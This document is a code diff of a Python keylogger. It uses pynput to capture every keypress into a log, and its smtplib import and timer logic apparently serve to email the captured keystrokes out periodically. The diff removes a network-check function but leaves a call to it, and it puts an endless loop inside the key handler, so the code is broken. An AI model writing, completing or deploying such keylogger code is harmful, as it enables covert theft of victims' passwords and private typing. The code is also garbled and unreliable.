@@ -1,15 +1,8 @@
 import smtplib
 from pynput.keyboard import Key, Listener
 import logging
-import socket
-import time
 import os
-def nc():
-    ipaddress=socket.gethostbyname(socket.gethostname())
-    if ipaddress=="127.0.0.1":
-        return 0
-    else:
-        return 1
+import time
 
 log_dir = ""
 global c
@@ -20,7 +13,7 @@ def on_press(key):
     while(True):
         logging.info('"{0}"'.format(key))
         if(nc()==1 and (time.time()-c)>=100):
-            print("sending email")
+            
             global c
             c=time.time()
             
